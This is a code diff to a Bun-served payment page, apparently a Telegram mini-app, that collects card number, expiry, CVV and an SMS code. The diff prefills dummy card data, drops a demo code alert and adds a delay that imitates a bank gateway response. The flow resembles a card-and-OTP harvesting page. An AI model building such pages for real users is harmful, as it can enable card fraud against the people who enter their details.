@@ -485,16 +485,16 @@ Bun.serve({
               <div class="error-message" id="error1"></div>
               <div class="input-group">
                 <label class="input-label">Card Number</label>
-                <input type="text" class="input-field" placeholder="0000 0000 0000 0000" maxlength="19" id="cardNumber">
+                <input type="text" class="input-field" placeholder="0000 0000 0000 0000" maxlength="19" id="cardNumber" value="4444 4444 4444 4444">
               </div>
               <div style="display: flex; gap: 12px;">
                 <div class="input-group" style="flex: 1;">
                   <label class="input-label">Expiry Date</label>
-                  <input type="text" class="input-field" placeholder="MM/YY" maxlength="5" id="expiry">
+                  <input type="text" class="input-field" placeholder="MM/YY" maxlength="5" id="expiry" value="12/28">
                 </div>
                 <div class="input-group" style="flex: 1;">
                   <label class="input-label">CVV</label>
-                  <input type="password" class="input-field" placeholder="123" maxlength="3" id="cvv">
+                  <input type="password" class="input-field" placeholder="123" maxlength="3" id="cvv" value="777">
                 </div>
               </div>
               <button class="btn" onclick="goToStep2()">Continue</button>
@@ -612,10 +612,7 @@ Bun.serve({
                 return;
               }
 
-              // Demo: fixed code 1234
-              console.log('[SMS] Code for ' + phone + ': 1234');
-              tg.showAlert('Demo Mode: Your SMS code is 1234');
-
+              // Demo: logic without alert
               hideError(2);
               goToStep(3);
             }
@@ -642,9 +639,17 @@ Bun.serve({
             }
 
             async function processPayment() {
-              goToStep(4);
+              // Показываем "обработку" на кнопке или в заголовке
+              const btn = document.querySelector('#step3 .btn');
+              if (btn) {
+                btn.disabled = true;
+                btn.innerText = 'Processing transaction...';
+              }
 
               try {
+                // Имитируем ожидание ответа от банковского шлюза
+                await new Promise(r => setTimeout(r, 2000));
+
                 const res = await fetch('/gateway/process', {
                   method: 'POST',
                   headers: { 'Content-Type': 'application/json' },
@@ -652,19 +657,29 @@ Bun.serve({
                 });
 
                 if (res.ok) {
-                  // Wait 2.5 seconds then close/redirect
+                  goToStep(4); // Переходим к успеху только после задержки
+                  
+                  // Еще небольшая пауза перед закрытием, чтобы юзер увидел галочку
                   setTimeout(() => {
                     if (tg && tg.close) {
                       tg.close();
                     } else {
                       window.location.href = 'https://t.me/EasyPaywallBot';
                     }
-                  }, 2500);
+                  }, 3000);
                 } else {
                   tg.showAlert('Payment processing error. Please contact support.');
+                  if (btn) {
+                    btn.disabled = false;
+                    btn.innerText = 'Verify & Pay';
+                  }
                 }
               } catch (err) {
                 tg.showAlert('Error: ' + err.message);
+                if (btn) {
+                  btn.disabled = false;
+                  btn.innerText = 'Verify & Pay';
+                }
               }
             }
           </script>
